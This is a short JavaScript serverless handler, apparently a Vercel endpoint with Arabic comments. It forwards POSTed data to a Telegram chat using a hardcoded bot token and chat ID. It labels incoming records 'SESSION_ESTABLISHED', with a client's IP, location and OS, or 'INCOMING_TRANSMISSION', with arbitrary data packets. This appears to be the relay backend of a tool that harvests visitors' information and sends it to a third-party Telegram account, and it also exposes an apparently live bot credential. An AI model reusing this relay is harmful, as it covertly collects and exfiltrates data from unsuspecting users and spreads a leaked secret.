export default async function handler(req, res) {
    const TOKEN = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU";
    const CHAT_ID = "5446862709";

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { type, data } = req.body;
        let message = "";

        if (type === 'intel') {
            message = `🔍 **SESSION_ESTABLISHED**\nIP: ${data.ip}\nLOC: ${data.loc}\nOS: ${data.os}`;
        } else {
            message = `🏴 **INCOMING_TRANSMISSION**\n\n**NODE:** ${data.node}\n**DATA:** ${data.packet}`;
        }

        // استخدام fetch العادي المتوافق مع Node.js 18+ على Vercel
        const telegramRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });

        const result = await telegramRes.json();

        if (result.ok) {
            return res.status(200).json({ success: true });
        } else {
            // لو تليجرام رفض، هيرجع لنا السبب هنا
            return res.status(500).json({ error: 'Telegram API Error', details: result });
        }

    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
